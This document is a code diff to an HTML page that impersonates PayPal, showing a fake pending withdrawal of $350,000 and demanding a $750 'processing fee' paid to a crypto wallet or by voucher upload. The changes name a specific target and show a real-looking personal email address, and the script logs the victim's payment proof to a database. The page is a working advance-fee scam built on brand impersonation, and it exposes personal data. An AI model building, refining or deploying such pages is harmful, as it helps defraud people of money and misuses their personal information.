@@ -50,7 +50,6 @@
             color: var(--paypal-dark-blue);
         }
 
-        /* Styling based on the reference layout */
         .status-icon-container {
             width: 65px;
             height: 65px;
@@ -99,7 +98,7 @@
             border: 1px solid #e1e8ed;
             padding: 15px;
             border-radius: 8px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: left;
         }
 
@@ -118,16 +117,68 @@
             color: var(--paypal-dark-blue);
         }
 
+        .profile-info-box {
+            background: #f0f8ff;
+            border: 1px dashed var(--paypal-blue);
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .profile-info-box p {
+            margin: 4px 0;
+            color: #333;
+        }
+
+        /* Tab Switcher Styles */
+        .tabs-container {
+            display: flex;
+            background: #e9ecef;
+            border-radius: 8px;
+            padding: 4px;
+            margin-bottom: 15px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            font-weight: 600;
+            color: #555;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        .tab-btn.active {
+            background: #ffffff;
+            color: var(--paypal-dark-blue);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .tab-content {
+            display: none;
+            text-align: left;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
         .wallet-box {
             background: #f1f4f8;
             border: 1px solid #d1d9e0;
-            padding: 10px 12px;
+            padding: 12px;
             border-radius: 8px;
             font-family: monospace;
             font-size: 13px;
             color: #333;
             word-break: break-all;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             text-align: center;
         }
 
@@ -144,19 +195,14 @@
             color: #444;
         }
 
-        input[type="file"], input[type="email"] {
+        input[type="file"] {
             width: 100%;
-            padding: 12px 15px;
+            padding: 10px;
             border: 1px solid #ccc;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 13px;
             box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        input:focus {
-            border-color: var(--paypal-blue);
+            background: #fff;
         }
 
         .btn-paypal {
@@ -186,6 +232,7 @@
         .btn-secondary {
             background-color: #6c757d;
             box-shadow: 0 2px 6px rgba(108, 117, 125, 0.3);
+            margin-top: 0;
         }
 
         .btn-secondary:hover {
@@ -213,64 +260,87 @@
     <div class="container">
         <div class="logo">Pay<span>Pal</span></div>
 
-        <!-- Status Icon matching reference layout -->
         <div class="status-icon-container">
             <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
         </div>
 
         <h2>Withdrawal Processing</h2>
-        <p class="subtitle">Your withdrawal request of <strong style="color:#000;">$150.00</strong> is currently under review.</p>
+        <p class="subtitle">Your withdrawal request of <strong style="color:#000;">$350,000.00</strong> is currently under review.</p>
         
         <div>
             <span class="badge-pending">⏳ PENDING</span>
         </div>
 
-        <!-- Details Summary Box matching structure -->
+        <!-- Summary details box -->
         <div class="summary-box">
             <div class="row">
                 <span>Withdrawal Amount:</span>
-                <strong>$150.00 USD</strong>
+                <strong>$350,000.00 USD</strong>
             </div>
             <div class="row">
-                <span>Consolidated Fee:</span>
-                <strong>$5.00 USD</strong>
+                <span>Processing Fee:</span>
+                <strong>$750.00 USD</strong>
             </div>
         </div>
 
-        <!-- Wallet / Destination Address Box -->
-        <div class="wallet-box" id="walletAddress">
-            0x7C3Effee94c4D79A951FC51f62201bD88785A
+        <!-- PayPal Name and Email Display -->
+        <div class="profile-info-box">
+            <p><strong>PayPal Name:</strong> John Daniel</p>
+            <p><strong>PayPal Email:</strong> <span id="displayEmail">mhilesjr@gmail.com</span></p>
         </div>
 
-        <button type="button" class="btn-paypal btn-secondary" id="copyBtn" onclick="copyAddress()">Copy Address</button>
+        <!-- Payment Options Tabs (TRC20 vs Voucher) -->
+        <div class="tabs-container">
+            <button class="tab-btn active" onclick="switchTab('trc20', event)">💎 Pay with TRC20</button>
+            <button class="tab-btn" onclick="switchTab('voucher', event)">💳 Pay with Voucher</button>
+        </div>
 
-        <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">
-
-        <!-- Form for uploading receipt & proof -->
-        <form id="paymentForm">
-            <div class="form-group">
-                <label for="userEmail">PayPal Email</label>
-                <input type="email" id="userEmail" placeholder="Enter your email" required>
+        <!-- TRC20 Section -->
+        <div id="trc20Tab" class="tab-content active">
+            <p style="font-size: 13px; color: #666; margin-bottom: 8px;">Send $750 to the TRC20 address below:</p>
+            <div class="wallet-box" id="walletAddress">
+                0x7C3Effee94c4D79A951FC51f62201bD88785A
             </div>
+            <button type="button" class="btn-paypal btn-secondary" id="copyBtn" onclick="copyAddress()">Copy Address</button>
+        </div>
 
-            <div class="form-group">
-                <label for="paymentProof">Upload Payment Screenshot / Receipt</label>
-                <input type="file" id="paymentProof" accept="image/*" required>
-            </div>
+        <!-- Voucher / Receipt Upload Section -->
+        <div id="voucherTab" class="tab-content">
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label for="paymentProof">Upload Voucher / Payment Screenshot</label>
+                    <input type="file" id="paymentProof" accept="image/*" required>
+                </div>
 
-            <button type="submit" class="btn-paypal" id="submitBtn">I've Sent the Payment</button>
-        </form>
+                <button type="submit" class="btn-paypal" id="submitBtn">I've Sent the Payment</button>
+            </form>
+        </div>
     </div>
 
     <script>
-        // Automatically grab email from URL parameter if passed from index.html
+        let currentEmail = "mhilesjr@gmail.com";
+
+        // Grab email from URL parameter if available
         window.addEventListener('DOMContentLoaded', () => {
             const urlParams = new URLSearchParams(window.location.search);
             const emailParam = urlParams.get('email');
             if (emailParam) {
-                document.getElementById('userEmail').value = emailParam;
+                currentEmail = emailParam;
+                document.getElementById('displayEmail').innerText = currentEmail;
             }
         });
+
+        function switchTab(tabName, event) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+
+            if(tabName === 'trc20') {
+                document.getElementById('trc20Tab').classList.add('active');
+            } else {
+                document.getElementById('voucherTab').classList.add('active');
+            }
+            event.currentTarget.classList.add('active');
+        }
 
         function copyAddress() {
             const addressText = document.getElementById('walletAddress').innerText;
@@ -293,7 +363,6 @@
         document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const email = document.getElementById('userEmail').value.trim();
             const fileInput = document.getElementById('paymentProof');
             const submitBtn = document.getElementById('submitBtn');
 
@@ -328,8 +397,8 @@
                         .insert([
                             { 
                                 name: 'John Daniel', 
-                                email: email, 
-                                amount_paid: '5.00', 
+                                email: currentEmail, 
+                                amount_paid: '750.00', 
                                 proof_url: filePath 
                             }
                         ]);
